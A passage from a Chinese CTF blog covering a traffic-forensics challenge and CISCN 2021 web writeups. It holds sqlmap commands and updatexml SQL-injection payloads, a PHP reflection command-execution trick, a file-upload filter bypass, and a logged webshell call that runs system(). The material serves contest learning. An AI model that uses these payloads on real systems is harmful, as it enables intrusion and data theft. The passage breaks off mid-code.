alt="img"></p></li><li><p>对解密后的客户端过滤http，发现无get/post，分析最后一个http回显（或者可疑的200包，只有一行txt/html返回值的）原始数据包返回<code>72a9c691ccdaab98fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=b4c4e1f6ddd2a488</code>==去掉前面的16位和后面的16位== （代码审计）得到<code>fL1tMGI4YTljMn75e3jOBS5/V31Qd1NxKQMCe3h4KwFQfVAEVworCi0FfgB+BlWZhjRlQuTIIB5jMTU=</code>，放到前面的解密代码在线php解密，得到flag<code>flag&#123;5db5b7b0bb74babb66e1522f3a6b1b12&#125;</code></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/img/image-20211209193723030.png" alt="image-20211209193723030"></p><ul><li>（也可这样：最后解哥斯拉的方法，其他师傅他们是直接用放进哥斯拉里面，然后让哥斯拉帮忙解码，看到flag的）</li></ul></li></ul><h2 id="ios"><a href="#ios" class="headerlink" title="ios"></a>ios</h2><p><span style="background:#FFDBBB;">收获：wireshark检索特定内容 + TLS流量包解密 + 查看端口扫描、导出分组详情</span></p><h3 id="📚准备知识-3"><a href="#📚准备知识-3" class="headerlink" title="📚准备知识"></a>📚准备知识</h3><blockquote><ul><li>【<a href="https://webcache.googleusercontent.com/search?q=cache:8RUq5kprt08J:https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html+&cd=6&hl=zh-CN&ct=clnk&gl=us">TLS/SSL阮一峰详解原理</a>】</li><li><a href="https://blog.csdn.net/walleva96/article/details/106844033">详细：wireshark解密tls，CSDN</a></li><li><a href="https://www.cnblogs.com/lv6965/p/7859925.html">使用wireshark分析TLS</a></li><li><a href="https://segmentfault.com/a/1190000018746027">思否：，图文详解，如何用 wireshark 抓包 TLS 封包</a></li></ul></blockquote><h3 id="✍解题-3"><a href="#✍解题-3" class="headerlink" title="✍解题"></a>✍解题</h3><p> Ios题目描述：一位ios的安全研究员在家中使用手机联网被黑，不仅被窃密还丢失比特币若干，请你通过流量和日志分析后作答</p><ul><li><p>10.1黑客所控制的C&amp;C服务器IP是______3.128.156.159_______。</p><ul><li><p>筛选http contains “github”，追踪具体的tcp流，可以发现这⾥有转发操作</p><p><img src="https://api2.mubu.com/v3/document_image/ddf57b05-2f8f-406c-b568-da87be40f707-11812322.jpg" alt="img"></p></li></ul></li><li><p>10.2黑客利用的Github开源项目的名字是__Stowaway____。（如有字母请全部使用小写）</p><ul><li>同上一题的包</li></ul></li><li><p>10.3通讯加密密钥的明文是____hack4sec________。</p><ul><li>打开上边那个工具的主页，看下readme，发现-s后跟的就是密钥</li></ul></li></ul><h4 id="TLS流量包解密"><a href="#TLS流量包解密" class="headerlink" title="TLS流量包解密"></a>TLS流量包解密</h4><p>10.4黑客通过SQL盲注拿到了一个敏感数据，内容是______746558f3-c841-456b-85d7-d6c0f2edabb2______。</p><ul><li><p><strong>部分存在TLS加密的流量需要用到秘钥进行解密</strong>  ，【<span style="background:#FF9999;">而例如chrome，firefox， curl 等应用， 当设置了SSLKEYLOGFILE的环境变量， 就能够获取到每次对话产生的key log文件。<strong>利用每次对话中，存储下来的key log来解密报文</strong>是一种非常普遍的手段</span>】</p></li><li><p>key.txt中的<strong>“Master-Key”为主密钥，主密钥并不是最终加解密使用的密钥</strong>，会话密钥是通过主密钥再进一步计算获得。</p></li><li><p>编辑-&gt;首选项-&gt;protocols-&gt;TLS导入文件，要导入https证书了，(把key.log中rsa session都去了只留CLIENT_RANDOM文件然后导入tls文件)【可去可不去】，</p><p><img src="https://api2.mubu.com/v3/document_image/203c83ea-0460-4652-838a-6d3c9658a7f6-11812322.jpg" alt="img"></p></li><li><p>发现新出现的http2有注入的内容，然后筛一下http2流（<code>ip.dst == 192.168.1.12 &amp;&amp;http2</code>），到处文件可以看到sql盲注的内容，然后就导出分组解析结果-&gt;csv-&gt;改后缀为txt-&gt;导入bake url解码-&gt;导出文件，挨个数或者写脚本看下盲注的内容。【ctrl f password,4,第一个前面就是猜对的字母】</p><p><img src="https://api2.mubu.com/v3/document_image/e3a4ae51-28eb-4815-b18e-338f29d16c5a-11812322.jpg" alt="img"><img src="https://api2.mubu.com/v3/document_image/64da732b-43bb-4499-a7c0-99ad0b13d44f-11812322.jpg" alt="img" style="zoom:50%;"></p></li></ul><p>10.5黑客端口扫描的扫描器的扫描范围是_____10-499_______。（格式使用“开始端口-结束端口”，例如1-65535）</p><ul><li><p>\1. 在Wireshark中，直接观察数据包：显示目标地址的端口号：打开编辑-&gt;首选项设置-&gt;列-&gt;按“添加”按钮-&gt;在字段类型中选择<code>Dest port(unresolved)</code>即可。发现连续端口扫描是10-499</p></li><li><p>\2. 师傅们的wp：也可在linux用代码<code>$ tcpdump -n -r triffic.pcap  | awk &#39;&#123;print $2$3&#125;&#39; | sort -u &gt; su.txt  </code>将数据流dump出来，观察被扫描的端口位置，从10开始到499<code>reading from file triffic.pcap, link-type EN10MB (Ethernet)</code></p><img src="https://api2.mubu.com/v3/document_image/1c4cc9bc-d569-408e-8e62-83323c05898f-11812322.jpg" alt="img" style="zoom:50%;"></li></ul><p>10.6被害者手机上被拿走了的私钥文件内容是____________。</p><p>10.7黑客访问/攻击了内网的几个服务器，IP地址为<code>_____172.28.0.2#192.168.1.12_______</code>。（多个IP之间按从小到大排序，使用#来分隔，例如127.0.0.1#192.168.0.1)</p><ul><li>wireshark里被扫描的192.168.1.12和access.log里被写后门的172.28.0.2</li></ul><p>10.8黑客写入了一个webshell，其密码为<code>____fxxk________</code>。</p><pre><code class="hljs accesslog"><span class="hljs-string">&quot;<span class="hljs-keyword">GET</span> /favicon.ico HTTP/1.1&quot;</span> <span class="hljs-number">200</span> <span class="hljs-number">43</span> <span class="hljs-string">&quot;http://172.28.0.2//ma.php?fxxk=system(base64_decode(%27d2hvYW1p%27));&quot;</span> <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span> <span class="hljs-string">&quot;-&quot;</span></code></pre><p>密码为fxxk</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF,比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn 2021 web WP</title>
    <link href="/2021/09/06/ciscn%202021%20web%20wp/"/>
    <url>/2021/09/06/ciscn%202021%20web%20wp/</url>
    
    <content type="html"><![CDATA[<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p><strong>考点：无列名和报错注入</strong></p><ol><li>爆表名：</li></ol><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -common-tables</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143910.png" alt="image-20210515132807394"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143912.png" alt="image-20210515132817070"></p><ol start="2"><li>爆列名，发现只有自增id列，说明还有列名没有显示，==这时候就应该想到无列名注入了==<pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T flag --columns --<span class="hljs-keyword">hex</span></code></pre></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143913.png" alt="image-20210515135616512"></p><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T flag -C <span class="hljs-string">&quot;id&quot;</span> --<span class="hljs-keyword">dump</span> --<span class="hljs-keyword">hex</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143914.png" alt="image-20210515135759698"></p><ol start="3"><li>另一个表啥也没有</li></ol><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T users --columns --<span class="hljs-keyword">hex</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143915.png" alt="image-20210515140045222"></p><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T users -C <span class="hljs-string">&quot;id,username&quot;</span> --<span class="hljs-keyword">dump</span> --<span class="hljs-keyword">hex</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143916.png" alt="image-20210515140322605"></p><ol start="4"><li>用户信息也不是管理员</li></ol><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  --is-dba</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143917.png" alt="image-20210515142804930"></p><p>5.无列名报错注入</p><pre><code class="hljs sql">1&#x27;) and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> flag <span class="hljs-keyword">as</span> b <span class="hljs-keyword">using</span>(<span class="hljs-keyword">id</span>,<span class="hljs-keyword">no</span>))<span class="hljs-keyword">as</span> c),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre><p>报错出字段，继续</p><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27;)||updatexml(<span class="hljs-number">1</span>,((select `cb<span class="hljs-number">9704</span>e<span class="hljs-number">8</span>-dfcb-<span class="hljs-number">4</span>feb-<span class="hljs-number">90</span>c<span class="hljs-number">7</span>-d<span class="hljs-number">84</span>c<span class="hljs-number">92</span>ef<span class="hljs-number">0062</span>` from flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>#&amp;Submit=%E<span class="hljs-number">7</span>%<span class="hljs-number">99</span>%BB%E<span class="hljs-number">5</span>%BD%<span class="hljs-number">95</span></code></pre><h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">原题</a></p><ol><li>这题考察了php原生类的使用，参考ctfshow的web100使用反射类new ReflectionClass(“类名”)，获得这个类的信息</li><li>原题，ReflectionMethod 构造 User 类中的函数方法，再通过 getDocComment 获取函数的注释</li><li>考虑利用原生类ReflectionMethod读取用户类中的方法</li></ol><p><strong>dirsearch使用</strong></p><p><a href="https://www.cnblogs.com/qingchengzi/articles/12652232.html">教程1</a></p><pre><code class="hljs diff"><span class="hljs-deletion">-u  指定需要扫描URL</span><span class="hljs-deletion">-e   指定需要扫描的文件名    例如：-e php  如果不知道即所有 -e *</span><span class="hljs-deletion">-w  指定自定义的字典文件路径</span>排除多个响应状态码：-x 403,302,301<span class="hljs-deletion">-r 递归扫描     非常耗时</span>//在扫描时要退出扫描，请从键盘解析“e”。要从停止点继续执行，请解析“c&quot;。解析“ n”以移至下一个目录。这些步骤将使您可以控制结果，因为递归扫描是一个耗时的过程。<span class="hljs-deletion">-R 递归深度级别</span></code></pre><h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><p><a href="https://ninjia.gitbook.io/secskill/web/info">**参考，secskill</a>，<a href="https://www.yuque.com/lakemoon/dctose/tpg530">语雀+漏洞案例</a>、<a href="https://www.imbajin.com/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%B9%8B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B(%E4%B8%80)/">个人博客初级+python批量扫描</a></p><pre><code>1.    常见检测方法是通过对网站进行web漏洞扫描，直接利用爬虫来爬取网站可能存在的路径以及链接，如果存在备份文件，则可通过web直接进行下载。2.    也可以通过自行构造字典，对网站某一目录下，指定字典进行爆破，常见的扫描工具有wwwscan、御剑后台扫描工具等。3. 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</code></pre><p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp<br>再次意外退出后，将会产生名为 .index.php.swo 的交换文件<br>第三次产生的交换文件则为 .index.php.swn</p><pre><code class="hljs css">常见的备份文件格式有：<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.phps</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swp</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swo</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.php</span>~<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.txt</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.old</span></code></pre><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p><a href="https://www.kancloud.cn/shaoguan/phpstudy/384102">笔记</a><br><a href="https://juejin.cn/post/6844904148891074568">****掘金，各类函数，属性用法</a><br><a href="https://www.jianshu.com/p/d02cbde1cdd7">简书</a></p><blockquote><p>面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射。<br>反射，直观理解就是根据到达地找到出发地和来源。比如，<strong>一个光秃秃的对象，我们可以仅仅通过这个对象就能知道它所属的类、拥有哪些方法</strong>。<br>反射是指在PHP运行状态中，扩展分析PHP程序，导出或提出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取信息以及动态调用对象方法的功能称为反射API。</p></blockquote><pre><code class="hljs php"><span class="hljs-comment">// 获取对象属性列表</span>$reflect = <span class="hljs-keyword">new</span> ReflectionObject($student);$props　= $reflect-&gt;getProperties();<span class="hljs-keyword">foreach</span> ($props <span class="hljs-keyword">as</span> $prop) &#123;  <span class="hljs-keyword">print</span> $prop-&gt;getName() .<span class="hljs-string">&quot;\n&quot;</span>;&#125;<span class="hljs-comment">// 获取对象方法列表</span>$m=$reflect-&gt;getMethods();<span class="hljs-keyword">foreach</span> ($m <span class="hljs-keyword">as</span> $prop) &#123;  <span class="hljs-keyword">print</span> $prop-&gt;getName() .<span class="hljs-string">&quot;\n&quot;</span>;&#125;</code></pre><p>反射注释</p><pre><code class="hljs awk"><span class="hljs-variable">$classComment</span> = <span class="hljs-variable">$refClass</span>-&gt;getDocComment();  <span class="hljs-regexp">//</span> 获取User类的注释文档，即定义在类之前的注释<span class="hljs-variable">$methodComment</span> = <span class="hljs-variable">$refClass</span>-&gt;getMethod(<span class="hljs-string">&#x27;setPassowrd&#x27;</span>)-&gt;getDocComment();  <span class="hljs-regexp">//</span> 获取User类中setPassowrd方法的注释<span class="hljs-regexp">//</span><span class="hljs-variable">$classComment</span> 结果如下：<span class="hljs-regexp">/** * 用户相关类 */</span><span class="hljs-regexp">//</span><span class="hljs-variable">$methodComment</span> 结果如下：<span class="hljs-regexp">/** * 设置密码 * @param string $password */</span></code></pre><h3 id="ctf-中的php反射"><a href="#ctf-中的php反射" class="headerlink" title="ctf 中的php反射"></a>ctf 中的php反射</h3><p><a href="https://www.codeleading.com/article/24664981902/">参考+讲解ctfshow100</a></p><p>反射类不仅仅可以建立对类的映射，<strong>也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况【ReflectionClass类并传入PHP代码时，会返回代码的运行结果】</strong>。因此可以通过建立反射类new ReflectionClass(system(‘cmd’))来执行命令</p><p>要点：通过建立反射类<code>new ReflectionClass(system(&#39;cmd&#39;))</code>来执行命令</p><h3 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h3><ul><li><p>设法反射注释</p></li><li><p>平常我们用的比较多的是 ReflectionClass类 和 ReflectionMethod类</p></li><li><p>ReflectionClass类只能传入一个参数【参数是类名】，所以我们尝试ReflectionMethod类【参数是类名+方法】</p></li><li><p><code>$method = new ReflectionMethod(&#39;Counter&#39;, &#39;increment&#39;);</code></p></li><li><p>本题考察的是 PHP反射，ReflectionMethod 构造 User 类中的函数方法，再通过 getDocComment 获取函数的注释，本例中使用__toString 同样可以输出函数注释内容。</p></li><li><p>payload:</p><pre><code class="hljs dts">?rc=ReflectionMethod<span class="hljs-variable">&amp;ra</span>=User<span class="hljs-variable">&amp;rb</span>=a<span class="hljs-variable">&amp;rd</span>=getDocComment</code></pre><p>因为不知道是在哪个函数的注释中，所以逐个函数【rb】暴破，暴破 rb 的值 a-z，可以发现 flag 在 q的注释中，回显flag</p></li></ul><h4 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h4><p><a href="https://blog.csdn.net/wong_gilbert/article/details/76679108?utm_source=app&app_version=4.7.1">__tostring</a>：对象被当成字符串输出时会自动触发的函数，必须得有return</p><p><a href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/">2019ciscn反射</a></p><h2 id="easy-load"><a href="#easy-load" class="headerlink" title="easy_load"></a>easy_load</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/116885083?utm_source=app&app_version=4.7.1">**yu师傅</a><br>【<a href="https://midiya.blog.csdn.net/article/details/117044715">2</a>】</p><p>考点：</p><ol><li><a href="https://segmentfault.com/a/1190000000591094">php中$_FILES变量的用法及文件上传过程</a></li><li><a href="https://www.runoob.com/php/php-file-upload.html">菜鸟教程文件上传与$_FILES用法</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Sending_and_retrieving_form_data">MDN WEB DOCS发送表单数据</a></li></ol><h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><ol><li>在使用表单的时候经常将表单的数据发送至php脚本做处理，然后，我们可以用表单提交的过程来<strong>实现运行php脚本</strong></li><li>这样点击提交按钮时就可以实现运行php脚本，action里的php文件代表你要执行的脚本</li><li>action表示表单数据接收方，实现对数据的各种处理</li><li><code>$_FILES[&#39;file&#39;][&#39;tmp_name&#39;]</code>是该临时文件的路径（而非名称）</li></ol><p>index.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>]))    $ctf = $_GET[<span class="hljs-string">&quot;ctf&quot;</span>];<span class="hljs-keyword">if</span>($ctf==<span class="hljs-string">&quot;upload&quot;</span>) &#123;    <span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&#x27;postedFile&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1024</span>*<span class="hljs-number">512</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这么大个的东西你是想d我吗？&quot;</span>);    &#125;    $imageinfo = getimagesize($_FILES[<span class="hljs-string">&#x27;postedFile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);    <span class="hljs-keyword">if</span> ($imageinfo === <span class="hljs-literal">FALSE</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> ($imageinfo[<span class="hljs-number">0</span>] !== <span class="hljs-number">1</span> &amp;&amp; $imageinfo[<span class="hljs-number">1</span>] !== <span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);    &#125;    $fileName=urldecode($_FILES[<span class="hljs-string">&#x27;postedFile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//⚠️url解密了一波</span>    <span class="hljs-keyword">if</span>(stristr($fileName,<span class="hljs-string">&quot;c&quot;</span>) || stristr($fileName,<span class="hljs-string">&quot;i&quot;</span>) || stristr($fileName,<span class="hljs-string">&quot;h&quot;</span>) || stristr($fileName,<span class="hljs-string">&quot;ph&quot;</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);    &#125;    $imagePath = <span class="hljs-string">&quot;/var/www/html/image/&quot;</span> . mb_strtolower($fileName);  <span class="hljs-comment">//⚠️放</span>    <span class="hljs-keyword">if</span>(move_uploaded_file($_FILES[<span class="hljs-string">&quot;postedFile&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], $imagePath)) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;upload success, image at <span class="hljs-subst">$imagePath</span>&quot;</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;传都没有传上去&quot;</span>);    &#125;&#125;</code></pre><ol><li>getimagesize—返回图像信息【数组】,参数是路径/url，必须是图像，否则返回false<ul><li>返回数组信息：<blockquote><ul><li> 索引 0 给出的是图像宽度的像素值</li><li> 索引 1 给出的是图像高度的像素值</li><li> 索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li><li> 索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签</image></li><li> 索引 bits 给出的是图像的每种颜色的位数，二进制格式</li><li> 索引 channels 给出的是图像的通道值，RGB 图像默认是 3</li><li> 索引 mime 给出的是图像的 MIME 信息，此信息可以用来在 HTTP Content-type 头信息中发送正确的信息，如： header(“Content-type: image/jpeg”);</li><li>⚠️此时mime检测的不是数据包中的content-type，而是图片的文件头</li></ul></blockquote></li></ul></li><li>stristr() 函数搜索字符串在另一字符串中的第一次出现并返回其及余下部分</li><li>mb_strtolower—返回小写的字符串，比strtolower支持更多字符，如unicode</li><li>move_uploaded_file—将上传的文件A移动的新位置B，成功返回true，失败返回false</li></ol><h4 id="解读："><a href="#解读：" class="headerlink" title="解读："></a>解读：</h4><p>index.php内容：<br>参数ctf要==’upload’，大小要小于1024*512，文件得为图片，图片长宽需相等，文件名不能有c、i、h、ph，最后将文件名转小写上传到/var/www/html/image/下</p><p>example.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>]))    $ctf = $_GET[<span class="hljs-string">&quot;ctf&quot;</span>];<span class="hljs-keyword">if</span>($ctf==<span class="hljs-string">&quot;poc&quot;</span>) &#123;    $zip = <span class="hljs-keyword">new</span> \ZipArchive();    $name_for_zip = <span class="hljs-string">&quot;example/&quot;</span> . $_POST[<span class="hljs-string">&quot;file&quot;</span>];   <span class="hljs-comment">//⚠️压缩文件路径</span>    <span class="hljs-keyword">if</span>(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip))<span class="hljs-number">-1</span>]!==<span class="hljs-string">&quot;zip&quot;</span>) &#123;  <span class="hljs-comment">//⚠️</span>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;要不咱们再看看？&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="hljs-literal">TRUE</span>) &#123;        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;都不能解压呢&quot;</span>);    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;可以解压，我想想存哪里&quot;</span>;      $pos_for_zip = <span class="hljs-string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);   <span class="hljs-comment">//⚠️临时解压路径</span>    $zip-&gt;extractTo($pos_for_zip);   <span class="hljs-comment">//⚠️解压后直接去解压的路径example下访问md.php命令执行就行</span>    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(<span class="hljs-string">&quot;<span class="hljs-subst">$pos_for_zip</span>/*&quot;</span>);    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file)&#123;        <span class="hljs-keyword">if</span> (is_dir($file)) &#123;            <span class="hljs-keyword">continue</span>;        &#125;         $first = imagecreatefrompng($file);   <span class="hljs-comment">//⚠️</span>        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [<span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;width&#x27;</span> =&gt; $size, <span class="hljs-string">&#x27;height&#x27;</span> =&gt; $size]);        <span class="hljs-keyword">if</span> ($second !== <span class="hljs-literal">FALSE</span>) &#123;            $final_name = pathinfo($file)[<span class="hljs-string">&quot;basename&quot;</span>];            imagepng($second, <span class="hljs-string">&#x27;example/&#x27;</span>.$final_name);   <span class="hljs-comment">//⚠️修剪后的图片转移至example下</span>            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p><a href="https://cloud.tencent.com/developer/article/1722696">php利用ZipArchive类操作文件的实例</a></p><ul><li><p>类前加反斜杠意思是全局搜索类</p><blockquote><p>ZipArchive类—对文件进行压缩与解压缩处理</p><p>ZipArchive::extractTo,将压缩包解压到指定目录【解压】</p><p>ZipArchive::open,打开一个zip压缩包【必备】【成功返回true】</p><p>ZipArchive::addFile,将文件添加到指定zip压缩包中【压缩】</p><p>ZipArchive::addFromString,将指定内容的文件添加到压缩包</p></blockquote></li><li><p>$_SERVER[‘REMOTE_ADDR’]; //访问端（有可能是用户，有可能是代理的）IP【<a href="https://www.cnblogs.com/jackluo/archive/2013/03/03/2941411.html">与其他获取ip的区别</a>】 </p></li><li><p>unlink—删除文件，成功返回true【<code>/.</code>可以绕过unlink】</p></li><li><p><a href="https://www.w3school.com.cn/php/func_filesystem_glob.asp">glob</a> — 寻找与模式匹配的文件名/目录的数组</p></li><li><p><a href="https://www.jianshu.com/p/6600341d8754">简书，图像相关函数</a></p></li><li><p>imagecreatefrompng—由文件或url创建一个图像</p></li><li><p><a href="https://vimsky.com/examples/usage/php-imagecrop-function.html">imagecrop</a>—图像裁剪函数，将图像裁剪到给定的矩形区域，然后返回生成的图像。成功时返回裁剪的图像资源，或者在失败时返回FALSE。</p></li><li><p>imagejpeg—以 JPEG格式将图像输出到浏览器或文件</p></li><li><p>pathinfo() 函数以数组的形式返回文件路径/文件格式的信息，第二个参数指定哪个数组元素</p><pre><code class="hljs php"><span class="hljs-keyword">Array</span>([dirname] =&gt; /testweb[basename] =&gt; test.txt[extension] =&gt; txt)</code></pre><h4 id="解读：-1"><a href="#解读：-1" class="headerlink" title="解读："></a>解读：</h4></li></ul><p>example内容：<br>ctf参数要==’poc’，file文件最后后缀得为===zip【但是index.php里把i过滤了！】，并将其解压到<code>/tmp/example/用户ip</code> 目录下，并删除原压缩文件，对解压后的每一个文件，生成png并裁剪然后生成到example/下</p><h4 id><a href="#" class="headerlink" title></a></h4><h4 id="1-绕mb-strwolower"><a href="#1-绕mb-strwolower" class="headerlink" title="1. 绕mb_strwolower"></a>1. 绕mb_strwolower</h4><p>其中，在3.6、7.1等版本中，mb_strtolower(‘İ’)===’i’，mb_strtolower的小写映射时将’İ’映射到i，目前只发现该函数和如下字符存在漏洞：<strong>使用İ字符可以绕过i字符的匹配，如果php这三个字符也能绕过就能直接上传php了</strong></p><p><strong>结合example.php的解压压缩包 我们利用zİp来替代zip（İ会被解析/认为为I，再通过mb_strtolower就变成了i）</strong></p><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span 